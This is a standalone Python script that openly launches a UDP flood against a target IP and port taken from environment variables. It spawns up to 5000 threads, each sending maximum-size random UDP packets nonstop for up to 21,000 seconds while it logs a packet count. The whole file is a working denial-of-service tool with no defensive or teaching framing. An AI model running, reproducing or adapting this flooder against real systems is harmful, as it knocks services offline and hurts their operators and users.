#!/usr/bin/env python3
import os
import socket
import threading
import time
import sys

TARGET_IP = os.getenv("TARGET_IP", "").strip()
TARGET_PORT_STR = os.getenv("TARGET_PORT", "80").strip()
THREADS_STR = os.getenv("THREADS", "1000").strip()
DURATION_STR = os.getenv("DURATION", "21000").strip()

# Validation
if not TARGET_IP:
    print("❌ ERROR: TARGET_IP not set", file=sys.stderr)
    sys.exit(1)

try:
    TARGET_PORT = int(TARGET_PORT_STR)
    if not (1 <= TARGET_PORT <= 65535):
        raise ValueError("Port out of range")
except ValueError as e:
    print(f"❌ ERROR: Invalid TARGET_PORT: {e}", file=sys.stderr)
    sys.exit(1)

try:
    THREADS = min(int(THREADS_STR), 5000)  # max 5000 threads
except ValueError:
    THREADS = 1000

try:
    DURATION = min(int(DURATION_STR), 21000)  # max 21000 seconds
except ValueError:
    DURATION = 300

running = True
sent_count = 0
sent_lock = threading.Lock()

def flood(ip, port):
    global sent_count
    sock = None
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            payload = os.urandom(65507)
            sock.sendto(payload, (ip, port))
            with sent_lock:
                sent_count += 1
        except OSError:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

def main():
    global running

    print(f"🚀 UDP Flood starting")
    print(f"🎯 Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"🧵 Threads: {THREADS}")
    print(f"⏰ Duration: {DURATION}s")

    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=flood, args=(TARGET_IP, TARGET_PORT), daemon=True)
        t.start()
        threads.append(t)

    print(f"✅ {THREADS} threads started")

    start = time.time()
    try:
        while time.time() - start < DURATION:
            elapsed = int(time.time() - start)
            with sent_lock:
                pkts = sent_count
            print(f"📊 [{elapsed}s/{DURATION}s] Sent: {pkts} packets", flush=True)
            time.sleep(10)
    except KeyboardInterrupt:
        print("⏹️ Interrupted")
    finally:
        running = False

    print(f"✅ Done. Total packets sent: {sent_count}")

if __name__ == "__main__":
    main()
